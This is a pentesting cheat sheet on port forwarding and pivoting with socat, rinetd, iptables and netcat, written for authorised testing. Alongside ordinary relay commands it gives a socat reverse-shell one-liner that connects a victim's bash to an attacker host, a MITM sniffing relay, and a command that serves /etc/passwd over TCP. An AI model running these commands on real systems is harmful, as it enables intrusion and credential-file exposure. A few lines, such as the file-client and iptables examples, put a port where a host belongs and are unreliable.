# 🔌 Port Forwarding

> [!tip]
> Redirect traffic between hosts/networks.
> Useful in pentesting for pivoting, lateral movement, and firewall bypass.

## 🛠️ Socat – Swiss Army Knife

```bash
# Basic port forwarding
socat TCP-LISTEN:$LPORT,fork TCP:$RHOST:$RPORT

# UDP to UDP (simple relay)
socat UDP-LISTEN:$LPORT,fork UDP:$RHOST:$RPORT
```

### Reverse shell (nc equivalent)

```bash
# Listener
socat TCP-LISTEN:$LPORT,reuseaddr,fork -
# Victim
socat TCP:<ATTACK_IP>:$LPORT EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
```

### 🔁 Reverse port forwarding (victim -> attacker)

```bash
# On attacker (listener)
socat TCP-LISTEN:5555,reuseaddr,fork TCP-LISTEN:4444

# On victim (initiate connection to attacker)
socat TCP:$ATTACKER_HOST:5555 TCP:$TARGET_HOST:$TARGET_PORT
```

### MITM / Traffic Sniffing

```bash
socat -v TCP-LISTEN:$LPORT,fork TCP:$RHOST:$RPORT
```

### Encrypted tunnel (SSL/TLS)

```bash
socat OPENSSL-LISTEN:$LPORT,cert=cert.pem,key=key.pem,fork TCP:$RHOST:$RPORT
```

### UDP to TCP conversion

```bash
# UDP -> TCP
socat UDP-LISTEN:$LPORT,fork TCP:$RHOST:$RPORT
```

### Serve file over TCP

```bash
# Server
socat -v TCP-LISTEN:$LPORT,fork OPEN:/etc/passwd,rdonly

# Client
socat - TCP:$RPORT:$RPORT > reçu.txt
```

## ⚡ Rinetd – Simple TCP redirection

```bash
# /etc/rinetd.conf
$LHOST $LPORT $RHOST $RPORT
0.0.0.0 8080 10.10.10.10 80
```

```bash
rinetd -c /etc/rinetd.conf
```

## 🔒 Iptables / nftables port forwarding

::: details Enable IP forwarding (required)

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
# or permanently: sysctl -w net.ipv4.ip_forward=1
```

:::

```bash
# Redirect local port to remote
iptables -t nat -A PREROUTING -p tcp --dport $LPORT -j DNAT --to $RPORT:$RPORT
iptables -t nat -A POSTROUTING -j MASQUERADE
```

## 📡 Netcat (nc)

### Simple FIFO relay

```bash
# Forward local port to remote host
mkfifo /tmp/fifo; nc -lvp $LPORT 0</tmp/fifo | nc $RHOST $RPORT 1>/tmp/fifo
```

### Using ncat (more stable)

```bash
# Using ncat (Nmap version) with keepalive
ncat -lvp 8080 -c "ncat $RHOST $RPORT" --keep-open
```
